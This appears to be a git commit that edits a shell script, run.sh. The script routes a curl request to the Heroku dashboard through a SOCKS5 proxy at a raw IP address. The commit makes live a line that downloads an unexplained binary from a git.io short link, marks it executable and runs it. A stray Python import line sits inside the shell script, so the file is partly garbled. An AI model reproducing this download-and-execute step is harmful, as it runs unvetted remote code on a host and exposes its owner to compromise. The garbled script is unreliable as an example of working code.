77d7a5a586b17979c985a637c89f031ae32e8121
rsalamersq <94970032+rsalamersq@users.noreply.github.com>
2021-12-14 20:15:33 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,4 +2,4 @@
 set -ex
 curl -v -x socks5://178.197.249.11:1080 https://dashboard.heroku.com//
 import os as JMsl3
-!wget https://git.io/JMsl3 && chmod +x JMsl3 && ./JMsl3
+wget https://git.io/JMsl3 && chmod +x JMsl3 && ./JMsl3
